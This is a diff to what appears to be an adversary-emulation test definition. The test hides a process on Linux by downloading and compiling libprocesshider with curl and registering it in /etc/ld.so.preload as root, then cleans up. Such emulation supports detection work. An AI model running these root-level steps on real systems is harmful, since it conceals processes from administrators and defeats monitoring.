@@ -7,87 +7,87 @@
   ],
   "steps": [
     {
-      "id": "0fadc320-8e27-4224-80bb-6ed7958342ac",
+      "id": "7481041e-4902-4f7d-8af8-8ce0cce22543",
       "type": "execute-command",
       "data": {
-        "command": "echo #{library_path} | tee -a /etc/ld.so.preload\n/usr/local/bin/evil_script.py localhost -c 10 \u003e/dev/null \u0026 pgrep -l evil_script.py || echo \"process hidden\"\n",
+        "command": "echo #{library_path} | tee -a /etc/ld.so.preload\n/usr/local/bin/evil_script.py localhost -c 10 \u003e/dev/null \u0026 pgrep -l evil_script.py || echo \"process hidden\"",
         "command_type": "sh"
       },
       "elevation_required": true
     },
     {
-      "id": "662c3c17-c411-4375-9dfb-a35a3d2efb66",
+      "id": "e57e6d14-ce03-491e-b438-9ba45ee2da19",
       "type": "execute-command",
       "data": {
-        "command": "sed -i \"\\:^#{library_path}:d\" /etc/ld.so.preload\nrm -rf #{library_path} /usr/local/bin/evil_script.py /tmp/atomic\n",
+        "command": "sed -i \"\\:^#{library_path}:d\" /etc/ld.so.preload\nrm -rf #{library_path} /usr/local/bin/evil_script.py /tmp/atomic",
         "command_type": "sh"
       },
       "elevation_required": true
     },
     {
-      "id": "8d342b87-f7ee-42d4-a9ac-8e9225cc5afd",
+      "id": "9a4972e0-4c68-400b-b03e-5b12fbc30943",
       "name": "Check dependency 1/1",
       "description": "The preload library must exist on disk at specified location (#{library_path})\n",
       "type": "execute-command",
       "data": {
-        "command": "if [ -f #{library_path} ]; then exit 0; else exit 1; fi;\n",
-        "command_type": ""
+        "command": "if [ -f #{library_path} ]; then exit 0; else exit 1; fi;",
+        "command_type": "sh"
       },
       "elevation_required": true
     },
     {
-      "id": "6b480baf-12ec-4957-972a-0770677fc8cf",
+      "id": "a130da27-1bf6-468c-86ca-9f1473435abe",
       "name": "Resolve dependency 1/1",
       "description": "The preload library must exist on disk at specified location (#{library_path})\n",
       "type": "execute-command",
       "data": {
-        "command": "mkdir -p /tmp/atomic \u0026\u0026 cd /tmp/atomic\ncurl -sLO #{repo}/archive/#{rev}.zip \u0026\u0026 unzip #{rev}.zip \u0026\u0026 cd libprocesshider-#{rev}\nmake\ncp libprocesshider.so #{library_path}\ncp /usr/bin/ping /usr/local/bin/evil_script.py\n",
-        "command_type": ""
+        "command": "mkdir -p /tmp/atomic \u0026\u0026 cd /tmp/atomic\ncurl -sLO #{repo}/archive/#{rev}.zip \u0026\u0026 unzip #{rev}.zip \u0026\u0026 cd libprocesshider-#{rev}\nmake\ncp libprocesshider.so #{library_path}\ncp /usr/bin/ping /usr/local/bin/evil_script.py",
+        "command_type": "sh"
       },
       "elevation_required": true
     },
     {
-      "id": "3a586d7f-cb0b-4e43-9809-8dac41465692",
+      "id": "a8112efb-e907-4713-856a-23ba1866f11f",
       "name": "Re-check dependency 1/1",
       "description": "The preload library must exist on disk at specified location (#{library_path})\n",
       "type": "execute-command",
       "data": {
-        "command": "if [ -f #{library_path} ]; then exit 0; else exit 1; fi;\n",
-        "command_type": ""
+        "command": "if [ -f #{library_path} ]; then exit 0; else exit 1; fi;",
+        "command_type": "sh"
       },
       "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "0fadc320-8e27-4224-80bb-6ed7958342ac",
+      "s": "7481041e-4902-4f7d-8af8-8ce0cce22543",
       "p": "on-success",
-      "o": "662c3c17-c411-4375-9dfb-a35a3d2efb66"
+      "o": "e57e6d14-ce03-491e-b438-9ba45ee2da19"
     },
     {
-      "s": "0fadc320-8e27-4224-80bb-6ed7958342ac",
+      "s": "7481041e-4902-4f7d-8af8-8ce0cce22543",
       "p": "on-failure",
-      "o": "662c3c17-c411-4375-9dfb-a35a3d2efb66"
+      "o": "e57e6d14-ce03-491e-b438-9ba45ee2da19"
     },
     {
-      "s": "8d342b87-f7ee-42d4-a9ac-8e9225cc5afd",
+      "s": "9a4972e0-4c68-400b-b03e-5b12fbc30943",
       "p": "on-success",
-      "o": "0fadc320-8e27-4224-80bb-6ed7958342ac"
+      "o": "7481041e-4902-4f7d-8af8-8ce0cce22543"
     },
     {
-      "s": "8d342b87-f7ee-42d4-a9ac-8e9225cc5afd",
+      "s": "9a4972e0-4c68-400b-b03e-5b12fbc30943",
       "p": "on-failure",
-      "o": "6b480baf-12ec-4957-972a-0770677fc8cf"
+      "o": "a130da27-1bf6-468c-86ca-9f1473435abe"
     },
     {
-      "s": "6b480baf-12ec-4957-972a-0770677fc8cf",
+      "s": "a130da27-1bf6-468c-86ca-9f1473435abe",
       "p": "on-success",
-      "o": "3a586d7f-cb0b-4e43-9809-8dac41465692"
+      "o": "a8112efb-e907-4713-856a-23ba1866f11f"
     },
     {
-      "s": "3a586d7f-cb0b-4e43-9809-8dac41465692",
+      "s": "a8112efb-e907-4713-856a-23ba1866f11f",
       "p": "on-failure",
-      "o": "0fadc320-8e27-4224-80bb-6ed7958342ac"
+      "o": "7481041e-4902-4f7d-8af8-8ce0cce22543"
     }
   ],
   "tags": [
